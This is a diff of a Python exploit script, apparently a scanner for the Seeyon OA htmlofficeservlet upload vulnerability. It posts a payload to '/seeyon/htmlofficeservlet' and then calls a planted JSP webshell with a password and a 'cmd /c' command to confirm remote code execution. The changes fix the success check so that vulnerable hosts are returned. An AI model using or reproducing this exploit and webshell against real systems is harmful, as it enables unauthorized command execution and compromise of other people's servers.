@@ -1,5 +1,5 @@
 #! Author:Sessi0ns
-#! Github:https://github.com/Sessions/
+#! Github:https://github.com/Sessi0ns/
 
 import re
 import base64
@@ -19,16 +19,16 @@ def send_payload(url):
 
         r = requests.post(url + '/seeyon/htmlofficeservlet', data=payload)
 
-        r = requests.get(
-            url + '/seeyon/test123456.jsp?pwd=asasd3344&cmd=cmd%20+/c+echo+testexp')
+        r = requests.get(url + '/seeyon/test123456.jsp?pwd=asasd3344&cmd=cmd%20+/c+echo+testexp')
+        
 
         if "testexp" in r.text:
 
-            return 0
+            return url
 
         else:
 
-            return url
+            return 0
 
     except:
 
@@ -92,3 +92,4 @@ def main():
             break
 
 main()
+
